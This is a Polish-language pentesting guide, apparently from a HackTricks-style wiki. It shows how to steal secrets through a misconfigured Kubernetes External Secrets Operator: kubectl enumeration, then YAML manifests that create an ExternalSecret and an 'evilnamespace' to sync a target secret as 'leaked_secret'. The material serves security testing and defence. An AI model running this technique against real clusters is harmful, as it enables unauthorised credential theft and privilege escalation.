# Operator zewnętrznego sekretu

**Oryginalnym autorem tej strony jest** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Ta strona zawiera wskazówki, jak można zdobyć tajne informacje z źle skonfigurowanego ESO lub aplikacji, która używa ESO do synchronizacji swoich tajemnic.

## Oświadczenie

Technika pokazana poniżej może działać tylko w określonych okolicznościach. Na przykład zależy to od wymagań potrzebnych do umożliwienia synchronizacji tajemnicy w przestrzeni nazw, którą posiadasz / skompromitowałeś. Musisz sam to ustalić.

## Wymagania wstępne

1. Punkty zaczepienia w klastrze kubernetes / openshift z uprawnieniami administratora w przestrzeni nazw
2. Dostęp do odczytu co najmniej ExternalSecret na poziomie klastra
3. Dowiedz się, czy istnieją wymagane etykiety / adnotacje lub członkostwo w grupie, które są potrzebne do umożliwienia ESO synchronizacji twojej tajemnicy. Jeśli masz szczęście, możesz swobodnie ukraść zdefiniowaną tajemnicę.

### Zbieranie informacji o istniejącym ClusterSecretStore

Zakładając, że masz użytkowników, którzy mają wystarczające prawa do odczytu tego zasobu; zacznij od wylistowania istniejących _**ClusterSecretStores**_.
```sh
kubectl get ClusterSecretStore
```
### Wyliczanie ExternalSecret

Załóżmy, że znalazłeś ClusterSecretStore o nazwie _**mystore**_. Kontynuuj, wyliczając powiązane z nim externalsecret.
```sh
kubectl get externalsecret -A | grep mystore
```
_Ta zasób jest ograniczony do przestrzeni nazw, więc chyba że już wiesz, w której przestrzeni nazw szukać, dodaj opcję -A, aby przeszukać wszystkie przestrzenie nazw._

Należy uzyskać listę zdefiniowanych externalsecret. Załóżmy, że znalazłeś obiekt externalsecret o nazwie _**mysecret**_ zdefiniowany i używany przez przestrzeń nazw _**mynamespace**_. Zbierz nieco więcej informacji na temat rodzaju przechowywanej tajnej informacji.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Składanie elementów

Z tego miejsca możesz uzyskać nazwę jednej lub wielu nazw sekretów (tak jak zdefiniowano w zasobie Secret). Otrzymasz wynik podobny do:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
### Dotychczas uzyskaliśmy:

* Nazwa ClusterSecretStore
* Nazwa ExternalSecret
* Nazwa sekretu

Teraz, gdy mamy wszystko, czego potrzebujemy, możesz utworzyć ExternalSecret (i ewentualnie zmodyfikować/utworzyć nową przestrzeń nazw, aby spełnić wymagane warunki potrzebne do zsynchronizowania nowego sekretu):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Po kilku minutach, jeśli warunki synchronizacji zostały spełnione, powinieneś być w stanie zobaczyć wyciekły sekret wewnątrz swojego namespace'a.
```sh
kubectl get secret leaked_secret -o yaml
```
## Odnośniki

{% embed url="https://external-secrets.io/latest/" %}

{% embed url="https://github.com/external-secrets/external-secrets" %}
